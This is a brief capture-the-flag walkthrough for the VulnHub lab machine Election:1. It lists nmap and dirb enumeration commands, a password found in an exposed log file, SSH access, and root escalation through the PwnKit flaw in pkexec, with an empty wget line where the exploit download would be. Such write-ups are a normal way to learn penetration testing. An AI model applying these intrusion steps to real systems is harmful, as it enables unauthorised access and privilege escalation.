

# Election:1 Walkthrough 

**VulnHub Link:** [Election:1](https://www.vulnhub.com/entry/election-1,503/)
**Difficulty:** Easy
**Release Date:** 2 Jul 2020

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.131
```


## 2.Web Enumeration

```bash
dirb http://ip
```

domain adding to /etc/hosts

http://<domain>/election/admin/logs/system.log ---> love user found and it's password found

shell opened with ssh ----> user flag captured

## 3.Exploitation

pkexec version 0.105 ---> PwnKit vulnerability found

```bash
wget 
```
gaining root shell ---> root flag captured.
